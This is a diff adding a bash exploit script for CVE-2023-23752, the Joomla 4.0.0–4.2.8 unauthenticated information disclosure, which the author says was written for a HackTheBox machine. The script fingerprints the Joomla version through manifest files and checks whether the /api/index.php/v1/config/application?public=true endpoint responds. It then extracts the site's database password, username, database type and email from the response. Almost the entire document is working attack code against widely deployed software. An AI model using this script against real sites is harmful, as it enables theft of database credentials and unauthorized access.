@@ -1,0 +1,62 @@
+#!/bin/bash 
+#Hey this is Bearcules I made this Script for a Machine on HackTheBox
+#Version: 4.0.0 < 4.2.8 
+#Joomla! < 4.2.8 - Unauthenticated information disclosure
+#CVE : CVE-2023-23752
+## References >> 
+#>> https://www.exploit-db.com/exploits/51334
+#================================================================
+#Variables >> 
+payload="/api/index.php/v1/config/application?public=true"
+echo "Enter the Url ?" 
+read main_url
+url="http://$main_url"
+versions=("4.2.0" "4.2.1" "4.2.2" "4.2.3" "4.2.4" "4.2.5" "4.2.6" "4.2.7" "4.2.8") 
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+#getting the Version of Joomla >>
+version_enum_list=("/administrator/manifests/files/joomla.xml" "/plugins/system/cache/cache.xml"  "/language/en-GB/en-GB.xml") 
+for try in "${version_enum_list[@]}"; do
+version_exploit=$( curl -s "$url$try" | grep '<version>' | awk -F '</' '{print $1}' | awk -F '>' '{print $2}' )
+found=false 
+for ver in "${versions[@]}"; do 
+if [[ "$version_exploit" == "$ver" ]];then 
+found=true
+echo "Version information for $url$try:" 
+echo -e "\033[0;31m$version_exploit\033[0m" 
+break
+fi 
+done
+if [ "$found" == false ] ; then 
+break
+fi 
+done
+#Identifying >> Checking If The website is Vulnerable
+url_and_payload="$url""$payload"
+vuln_check=$(curl  -v "$url_and_payload" 2>&1 ) 
+if [[ *"$vuln_check"* == *"HTTP/1.1 200"* ]];then 
+	echo "Vulnerable"
+else 
+	echo "Not Vulnerable"
+fi
+#Asking the User to Proceed with Exploitaion >> 
+read -p "Do you want to Continue With Exploitation(y/n): " Continue
+if [ "$Continue" == "y" ]; then
+echo "Exploiting the Web Server"
+#Exploitation Process >>
+exploit=$(curl -s "$url_and_payload" ) 
+cleaning_output=$(echo -n  "$exploit")
+Importent_resp=$(echo "$cleaning_output" | jq | grep -e 'password' -e 'user' -e 'dbtype' -e 'email' )
+echo "$Importent_resp" | sed -e 's/password/'$'\033[0;31m''&'$'\033[0m''/g' -e 's/user/'$'\033[0;32m''&'$'\033[0m''/g' -e 's/host/'$'\033[0;34m''&'$'\033[0m''/g' -e 's/dbtype/'$'\033[0;35m''&'$'\033[0m''/g' | tr -d '\r,' | sed 's/["]//g'
+else
+echo "Exiting"
+fi
+
+
+
+
+
+
+  
+
